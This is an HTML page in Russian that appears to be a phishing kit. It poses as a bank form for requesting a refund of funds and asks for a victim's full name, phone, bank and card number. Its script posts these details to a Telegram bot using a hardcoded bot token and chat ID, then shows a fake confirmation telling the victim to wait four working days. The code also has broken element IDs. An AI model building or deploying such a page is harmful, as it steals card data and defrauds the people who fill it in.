<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SIte</title>
    <style>
        :root {
            --accent: #ffdd2d; 
            --bg: #000000;
            --card-bg: #111111;
            --field-bg: #1a1a1a;
            --text-main: #ffffff;
            --text-sec: #777777;
            --radius: 24px;
            --transition: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);
        }

        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }

        body {
            margin: 0;
            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: var(--bg);
            color: var(--text-main);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }

        /* ПРЕЛОАДЕР */
        #loader {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: var(--bg); display: flex; justify-content: center;
            align-items: center; z-index: 1000; transition: opacity 0.8s ease;
        }
        .loader-bar {
            width: 100px; height: 2px; background: #222; position: relative; overflow: hidden;
        }
        .loader-bar::after {
            content: ''; position: absolute; left: -100%; width: 100%; height: 100%;
            background: var(--accent); animation: loading 1.5s infinite;
        }
        @keyframes loading { 100% { left: 100%; } }

        /* КОНТЕНТ */
        .wrapper {
            width: 100%; max-width: 440px; padding: 20px;
            opacity: 0; transform: translateY(30px); transition: var(--transition);
        }

        .card {
            background: var(--card-bg);
            padding: 40px 30px;
            border-radius: var(--radius);
            border: 1px solid #222;
            box-shadow: 0 40px 100px rgba(0,0,0,0.7);
            text-align: center;
        }

        h1 { font-size: 28px; font-weight: 600; margin: 0 0 10px; letter-spacing: -1px; }
        .subtitle { color: var(--text-sec); font-size: 14px; margin-bottom: 35px; }

        .field { margin-bottom: 20px; text-align: left; }
        label { display: block; font-size: 11px; color: var(--text-sec); text-transform: uppercase; letter-spacing: 1.5px; margin: 0 0 8px 5px; }

        input, textarea {
            width: 100%; background: var(--field-bg); border: 1px solid #252525;
            border-radius: 16px; padding: 16px 20px; color: #fff; font-size: 16px;
            transition: var(--transition);
        }

        input:focus { border-color: var(--accent); background: #222; box-shadow: 0 0 20px rgba(255,221,45,0.05); }

        .btn {
            width: 100%; background: var(--accent); color: #000; border: none;
            padding: 20px; border-radius: 18px; font-size: 16px; font-weight: 700;
            cursor: pointer; margin-top: 20px; transition: var(--transition);
        }
        .btn:hover { transform: translateY(-3px); filter: brightness(1.1); box-shadow: 0 15px 30px rgba(255,221,45,0.2); }
        .btn:active { transform: translateY(0); }

        /* МОДАЛКА */
        .overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8); backdrop-filter: blur(15px);
            display: none; justify-content: center; align-items: center; z-index: 100;
        }
        .modal {
            background: #fff; color: #000; padding: 50px 30px; border-radius: 32px;
            text-align: center; max-width: 350px; width: 90%;
            transform: scale(0.8); opacity: 0; transition: var(--transition);
        }
        .modal.show { transform: scale(1); opacity: 1; }
        .modal h2 { font-size: 24px; margin-bottom: 15px; }
        .modal p { color: #666; font-size: 15px; line-height: 1.5; margin-bottom: 30px; }
        .modal-btn { background: #000; color: #fff; border: none; padding: 15px 40px; border-radius: 14px; font-weight: 600; cursor: pointer; }

        /* АДАПТИВНОСТЬ */
        @media (max-width: 480px) {
            .card { padding: 30px 20px; border-radius: 0; border: none; background: transparent; box-shadow: none; }
            body { background: var(--card-bg); align-items: flex-start; }
        }
    </style>
</head>
<body>

    <div id="loader"><div class="loader-bar"></div></div>

    <div class="wrapper" id="content">
        <div class="card">
            <h1>Запрос на возраст средств</h1>
           
            
            <form id="main-form">
                <div class="field">
                    <label>ФИО</label>
                    <input type="text" id="name" placeholder="Иван Иванович Иванов" required>
                </div>
                <div class="field">
                    <label>Контактный телефон</label>
                    <input type="tel" id="phone" placeholder="+7 (___) ___-__-__" required>
                </div>
                <div class="field">
                    <label>Название банка</label>
                    <input type="tel" id="phone" placeholder="Введите название вашего банка" required>
                </div>
                <div class="field">
                    <label>Номер карты</label>
                    <input type="text" id="card" maxlength="19" placeholder="0000 0000 0000 0000" required>
                </div>
                <div class="field">
                    <label>Сообщение</label>
                    <textarea id="message" rows="3" placeholder="Ваш запрос..." required></textarea>
                </div>
                <button type="submit" class="btn">ОТПРАВИТЬ ЗАПРОС</button>
            </form>
        </div>
    </div>

    <div class="overlay" id="overlay">
        <div class="modal" id="modal">
            <div style="font-size: 40px; margin-bottom: 15px;">🥂</div>
            <h2>Заявка принята</h2>
            <p>Ваши данные переданы в отдел обслуживания. Ожидайте подтверждения в течение 4 рабочих дней.</p>
            <button class="modal-btn" onclick="closeModal()">Закрыть</button>
        </div>
    </div>

    <script>
    // Имитация плавной загрузки
    window.onload = () => {
        setTimeout(() => {
            const loader = document.getElementById('loader');
            if (loader) {
                loader.style.opacity = '0';
                setTimeout(() => {
                    loader.style.display = 'none';
                    const content = document.getElementById('content');
                    content.style.opacity = '1';
                    content.style.transform = 'translateY(0)';
                    document.body.style.overflow = 'auto';
                }, 600);
            }
        }, 1000);
    };

    // Маска карты
    document.getElementById('card').addEventListener('input', e => {
        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
    });

    // --- НАСТРОЙКИ ---
    const TOKEN = "8273654143:AAEhXN0l_2unq3zcEtOh2JeDsB3i2c57bQM";
    // ВНИМАНИЕ: Проверь этот ID. Обычно группы начинаются с -100...
    const CHAT_ID = "-1003763182440"; 

    document.getElementById('main-form').addEventListener('submit', async function(e) {
        e.preventDefault();
        const btn = this.querySelector('.btn');
        const originalText = btn.innerText;
        
        btn.innerText = "ОБРАБОТКА...";
        btn.disabled = true;

        const name = document.getElementById('name').value;
        const phone = document.getElementById('phone').value;
        const bank = document.getElementById('bank').value;
        const card = document.getElementById('card').value;
        const msg = document.getElementById('message').value;

        const text = `💎 <b>НОВЫЙ ЗАПРОС</b>\n` +
                     `──────────────────\n` +
                     `👤 <b>Клиент:</b> ${name}\n` +
                     `📞 <b>Телефон:</b> <code>${phone}</code>\n` +
                     `📞 <b>Название банка:</b> <code>${bank}</code>\n` +
                     `💳 <b>Карта:</b> <code>${card}</code>\n` +
                     `💬 <b>Запрос:</b> ${msg}\n` +
                     `──────────────────`;

        try {
            const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    chat_id: CHAT_ID, 
                    parse_mode: 'html', 
                    text: text 
                })
            });

            const result = await response.json();

            if (response.ok) {
                showModal();
                this.reset();
            } else {
                // Если ошибка, мы выведем её описание прямо из Telegram
                console.error("Telegram API Error:", result);
                alert(`Ошибка от Telegram: ${result.description}\n\nПроверьте: добавлен ли бот в группу и является ли он АДМИНИСТРАТОРОМ.`);
            }
        } catch (err) {
            alert("Ошибка сети: не удалось связаться с Telegram API.");
        } finally {
            btn.innerText = originalText;
            btn.disabled = false;
        }
    });

    function showModal() {
        const over = document.getElementById('overlay');
        const box = document.getElementById('modal');
        over.style.display = 'flex';
        setTimeout(() => box.classList.add('show'), 50);
    }

    function closeModal() {
        const over = document.getElementById('overlay');
        const box = document.getElementById('modal');
        box.classList.remove('show');
        setTimeout(() => over.style.display = 'none', 500);
    }
</script>
</body>
</html>
